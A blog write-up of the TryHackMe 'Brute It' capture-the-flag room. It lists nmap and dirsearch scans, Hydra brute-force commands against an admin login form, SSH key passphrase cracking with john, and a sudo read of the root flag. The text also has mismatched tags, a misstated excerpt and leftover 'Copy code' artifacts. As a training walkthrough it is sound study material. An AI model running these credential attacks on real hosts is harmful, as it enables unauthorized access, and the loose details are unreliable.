---
title: "🧪 TryHackMe – Brute It"
layout: post
collection: writeups
permalink: /writeups/tryhackme-brute-it/
date: 2025-01-10
categories: [Writeups]
tags: [react, mysql, logistics]
image: /assets/images/writeups/brute-it/tryhackme-brute-it.png
thumbnail: /assets/images/writeups/brute-it/tryhackme-brute-it.png
icon: fas fa-bolt
excerpt: "Brute-forced SSH using Hydra, cracked RSA key with John the Ripper, and escalated to root on an Ubuntu machine."
description: "Hydra brute-force against an admin panel, SSH key crack with john, and privilege escalation on an Ubuntu machine."
---



![Brute It Screenshot](/assets/images/writeups/brute-it/tryhackme-brute-it.png)

## 🧠 Target
- Brute-force login credentials over SSH  
- Hash cracking  
- Privilege escalation

## 🛠 Tools Used
- Hydra  
- Nmap  
- John the Ripper  
- Kali Linux

## 🧭 Steps

### Step 1 — Deployed the target machine
Target IP: `10.10.34.33`  
Deployed the target and confirmed reachability.

![Target Machine](/assets/images/writeups/brute-it/target-machine.png)

### Step 2 — Nmap scan
Command:
nmap -sS -sV 10.10.34.33

markdown
Copy code
Findings: ports `22` (ssh) and `80` (http) open. SSH: **OpenSSH 7.6p1**. Apache: **2.4.29**. OS: **Ubuntu**.

![Nmap](/assets/images/writeups/brute-it/nmap.png)

### Step 3 — Hidden directories
Used dirsearch:
dirsearch -u http://10.10.34.33


Found `/admin` — admin login page available.

![Dirsearch](/assets/images/writeups/brute-it/dirsearch.png)

### Step 4 — Admin page analysis
Visited `http://10.10.34.33/admin`. Devtools revealed a username hint: `admin`.

![Admin Devtools](/assets/images/writeups/brute-it/User-login-info-devtools.png)

### Step 5 — Hydra brute-force
Initial (slow) command:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.34.33 http-post-form "/admin/:user=^USER^&pass=^PASS^login=^Login:Username or password invalid"

makefile
Copy code
Optimized:
hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -t 16 -vV 10.10.34.33 http-post-form "/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid"

ruby
Copy code
Result: `login: admin  password: xavier`

![Hydra](/assets/images/writeups/brute-it/hydra1.png)

### Step 6 — Logged in as admin
Gained user access. Web flag: `THM{brut3_f0rce_is_e4sy}`.

![Admin Login](/assets/images/writeups/brute-it/login-success.png)

### Step 7 — Extracted RSA private key & cracked it
Saved RSA private key and converted it for John:
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH hash
john --show hash

ruby
Copy code
Cracked key allowed SSH as `john`.

![RSA crack](/assets/images/writeups/brute-it/rockinroll.png)

### Step 8 — Shell & flags
Used the private key:
chmod 600 id_rsa
ssh -i id_rsa john@10.10.34.33
cat user.txt

ruby
Copy code
Web Flag: `THM{brut3_f0rce_is_e4sy}`  
User flag present. Then escalated to root.

![Shell](/assets/images/writeups/brute-it/root.png)

### Step 9 — Privilege escalation
Checked sudo rights:
sudo -l
sudo cat /root/root.txt

yaml
Copy code
Root flag: `THM{pr1v1l3g3_3sc4l4t10n}`

![Privilege](/assets/images/writeups/brute-it/sudo.png)

---

## 📘 Lessons Learned
- Enforce account lockout and rate-limiting (prevent brute-force).  
- Use multi-factor authentication or SSH key policies.  
- Avoid guessable credentials and default accounts.

---

## Notes / Artifacts
- Commands used and screenshots are included above.  
- Sanitize any client screenshots before publishing publicly.


